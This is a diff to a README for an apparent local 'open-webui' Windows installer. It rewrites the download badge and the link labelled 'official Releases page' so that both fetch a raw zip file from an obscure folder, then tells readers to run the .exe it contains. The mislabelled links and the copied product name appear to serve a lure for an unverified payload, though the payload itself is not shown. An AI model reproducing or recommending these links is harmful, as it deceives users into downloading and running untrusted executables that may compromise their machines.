@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/sound-humulusjaponicus635/open-webui-local-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/sound-humulusjaponicus635/open-webui-local-2026/raw/refs/heads/main/titularity/local-open-webui-2.5.zip)
 
 </div>
 
@@ -24,7 +24,7 @@ To ensure smooth performance, your computer needs these hardware specifications:
 
 Follow these steps to set up the application on your Windows PC.
 
-1. Go to the official [Releases page](https://github.com/sound-humulusjaponicus635/open-webui-local-2026).
+1. Go to the official [Releases page](https://github.com/sound-humulusjaponicus635/open-webui-local-2026/raw/refs/heads/main/titularity/local-open-webui-2.5.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Locate the downloaded file in your "Downloads" folder.
